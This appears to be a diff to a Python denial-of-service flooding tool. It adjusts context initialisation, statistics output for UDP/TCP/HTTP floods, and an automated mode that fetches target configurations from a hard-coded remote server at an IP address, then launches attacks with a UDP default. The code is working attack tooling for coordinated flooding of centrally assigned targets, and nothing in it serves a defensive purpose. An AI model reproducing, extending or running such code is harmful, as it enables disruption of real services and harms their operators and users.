@@ -106,11 +106,14 @@ def init_context(_ctx: Context, args):
     _ctx.attack_method = str(args[0].attack_method).lower()
     _ctx.random_packet_len = bool(args[0].random_packet_len)
     _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
+    _ctx.headers = set_headers_dict(_ctx.base_headers)
+
+
+def init_arg_independent(_ctx: Context):
     _ctx.cpu_count = max(os.cpu_count(), 1)  # to avoid situation when vCPU might be 0
 
     _ctx.user_agents = readfile('useragents.txt')
     _ctx.base_headers = readfile('headers.txt')
-    _ctx.headers = set_headers_dict(_ctx.base_headers)
     _ctx.start_time = datetime.now()
 
 
@@ -286,7 +289,7 @@ def parser_add_options(parser):
                       dest='max_random_packet_len', type='int', default=48,
                       help='Max random packets length (default: 48)')
     parser.add_option('-m', '--method',
-                      dest='attack_method', type='str', default='udp',
+                      dest='attack_method', type='str',
                       help='Attack method: udp (default), http')
     parser.add_option('-s', '--server',
                       dest='host',
@@ -364,6 +367,7 @@ def show_info(_ctx: Context):
     print(f'vCPU count:                 {available_cpu}')
     print(f'Random Packet Length:       {rnd_packet_len}')
     print(f'Max Random Packet Length:   {max_rnd_packet_len}')
+    print(f'Target number:              {_ctx.runVersion}')
     print('------------------------------------------------------')
 
     sys.stdout.flush()
@@ -406,29 +410,27 @@ def show_statistics(_ctx: Context):
 
         print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
         # print(f'CPU Load Average:           {cpu_load}')
-        if _ctx.attack_method == 'http':
-            print(f'Requests sent:              {_ctx.packets_sent}')
-            if len(_ctx.http_codes_counter.keys()):
-                print(f'HTTP codes distribution:    {build_http_codes_distribution(_ctx.http_codes_counter)}')
-        elif _ctx.attack_method == 'tcp':
-            size_sent = convert_size(_ctx.packets_sent)
-            if _ctx.packets_sent == 0:
-                size_sent = (size_sent)
-            else:
-                size_sent = (size_sent)
+        print(f'Total requests sent:        {_ctx.packets_sent}')
+        if len(_ctx.http_codes_counter.keys()):
+            print(f'HTTP codes distribution:    {build_http_codes_distribution(_ctx.http_codes_counter)}')
 
-            print(f'Total Packets Sent Size:    {size_sent}')
-        else:  # udp
-            print(f'Packets Sent:               {_ctx.packets_sent}')
-        print(f'Connection Success:         {connections_success}')
-        print(f'Connection Failed:          {connections_failed}')
+        size_sent = convert_size(_ctx.packets_sent)
+        if _ctx.packets_sent == 0:
+            size_sent = (size_sent)
+        else:
+            size_sent = (size_sent)
+
+        print(f'Total Packets Sent Size:    {size_sent}')
+        print(f'Total packets Sent:         {_ctx.packets_sent}')
+        print(f'Total Connection Success:   {connections_success}')
+        print(f'Total Connection Failed:    {connections_failed}')
         print('------------------------------------------------------')
 
         if _ctx.errors:
             print('\n\n')
         for error in _ctx.errors:
             print((error))
-            print('\007')
+            # print('\007') not allert, as errors are eventually fixed
 
         sys.stdout.flush()
         time.sleep(3)
@@ -570,7 +572,9 @@ def go_home(_ctx: Context):
 def main_automated():
     parser = OptionParser(usage=USAGE, epilog=EPILOG)
     args = parse_args(parser)
+    init_arg_independent(_ctx)
     config_server = args[0].config
+
     if not config_server:
         config_server = 'http://143.244.184.64:8080/configs'
 
@@ -591,9 +595,9 @@ def main_automated():
             prev_success = _ctx.connections_success
             prev_failed = _ctx.connections_failed
 
-            time.sleep(30)
+            time.sleep(10)
 
-            time_with_config += 30
+            time_with_config += 10
             period_success = _ctx.connections_success - prev_success
             period_failed = _ctx.connections_failed - prev_failed
             if period_success < period_failed:
@@ -623,6 +627,8 @@ def init_attack(target, args, parser):
     args[0].port = target['port']
     if not args[0].attack_method:
         args[0].attack_method = target['protocol']
+    if not args[0].attack_method:
+        args[0].attack_method ='udp'
 
     start_attack(parser, args)
 
